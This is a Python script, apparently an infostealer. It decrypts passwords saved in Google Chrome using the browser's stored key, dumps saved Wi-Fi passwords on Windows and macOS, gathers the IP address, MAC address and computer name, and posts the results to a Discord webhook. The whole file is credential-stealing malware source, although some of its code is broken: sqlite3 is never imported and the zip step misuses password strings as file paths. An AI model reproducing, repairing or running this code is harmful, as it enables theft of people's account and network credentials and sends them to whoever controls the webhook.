import os
import subprocess
import socket
import requests
from Crypto.Cipher import AES
import zipfile
import platform
import base64
import json
import win32crypt
webhook_url = ""
def decrypt_password(encrypted_password, key):
    try:
        encrypted_password = encrypted_password[3:]
        cipher = AES.new(key, AES.MODE_GCM, encrypted_password[:12])
        decrypted_password = cipher.decrypt(encrypted_password[12:-16]).decode('utf-8')
        return decrypted_password
    except Exception as e:
        print("Failed to decrypt password:", str(e))
        return ""

def get_encryption_key():
    local_state_path = os.path.join(os.environ["USERPROFILE"],
                                  "AppData", "Local", "Google", "Chrome",
                                  "User Data", "Local State")
    with open(local_state_path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    decrypted_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    return decrypted_key

def get_chrome_passwords():
    try:
        data_path = os.path.join(os.environ["USERPROFILE"],
                                 "AppData", "Local", "Google", "Chrome",
                                 "User Data", "Default", "Login Data")
        
        connection = sqlite3.connect(data_path)
        cursor = connection.cursor()
        cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        login_data = cursor.fetchall()
        connection.close()

        encryption_key = get_encryption_key()

        chrome_passwords = []
        for url, username, encrypted_password in login_data:
            decrypted_password = decrypt_password(encrypted_password, encryption_key)
            chrome_passwords.append(f"URL: {url}\nUsername: {username}\nPassword: {decrypted_password}\n")

        return chrome_passwords

    except Exception as e:
        print("Error accessing Chrome passwords:", str(e))
        return []

def get_wifi_passwords():
    try:
        if platform.system() == "Windows":
            command = "netsh wlan show profile key=clear"
            output = subprocess.check_output(command, shell=True).decode("utf-8")
            profiles = [line.split(":")[1].strip() for line in output.split("\n") if "All User Profile" in line]
            wifi_passwords = []
            for profile in profiles:
                try:
                    profile_output = subprocess.check_output(f"netsh wlan show profile name=\"{profile}\" key=clear", shell=True).decode("utf-8")
                    password_line = [line.split(":")[1].strip() for line in profile_output.split("\n") if "Key Content" in line][0]
                    wifi_passwords.append(f"SSID: {profile}\nPassword: {password_line}\n")
                except:
                    pass
            return wifi_passwords
        elif platform.system() == "Darwin":
            command = "/usr/sbin/security find-generic-password -D 'AirPort network password' -g"
            output = subprocess.check_output(command, shell=True).decode("utf-8")
            password_line = [line.split('"')[1] for line in output.split("\n") if "password" in line]
            wifi_passwords = [f"SSID: {socket.gethostname()}\nPassword: {password}\n" for password in password_line]
            return wifi_passwords
    except Exception as e:
        print("Error accessing WiFi passwords:", str(e))
        return []

def get_ip():
    try:
        ip = requests.get("https://api.ipify.org").text
        return ip
    except Exception as e:
        print("Error getting IP address:", str(e))
        return ""

def get_mac_address():
    try:
        mac = ':'.join(subprocess.check_output("getmac").decode("utf-8").strip().split()[3:9])
        return mac
    except Exception as e:
        print("Error getting MAC address:", str(e))
        return ""

def get_computer_name():
    try:
        computer_name = socket.gethostname()
        return computer_name
    except Exception as e:
        print("Error getting computer name:", str(e))
        return ""

def create_zip_file(file_paths, zip_file_name):
    with zipfile.ZipFile(zip_file_name, "w", zipfile.ZIP_DEFLATED) as zipf:
        for file in file_paths:
            zipf.write(file)

def send_to_discord(embed_fields):
 
    data = {
        "embeds": [
            {
                "title": "System Information",
                "color": 65280,
                "fields": embed_fields
            }
        ]
    }
    response = requests.post(webhook_url, json=data)
    if response.status_code == 204:
        print("System information sent to Discord webhook successfully.")
    else:
        print("Failed to send system information to Discord webhook. Status code:", response.status_code)

if __name__ == "__main__":
    encryption_key = get_encryption_key()
    chrome_passwords = get_chrome_passwords()
    wifi_passwords = get_wifi_passwords()
    ip_address = get_ip()
    mac_address = get_mac_address()
    computer_name = get_computer_name()

    # Create a ZIP file containing the Chrome passwords
    zip_file_name = "chrome_passwords.zip"
    create_zip_file(chrome_passwords, zip_file_name)

    embed_fields = [
        {"name": "Chrome Passwords", "value": "See attached ZIP file.", "inline": False},
        {"name": "WiFi Passwords", "value": "```" + "\n".join(wifi_passwords) + "```", "inline": False},
        {"name": "IP Address", "value": "```" + ip_address + "```", "inline": True},
        {"name": "MAC Address", "value": "```" + mac_address + "```", "inline": True},
        {"name": "Computer Name", "value": "```" + computer_name + "```", "inline": True}
    ]

    send_to_discord(embed_fields)
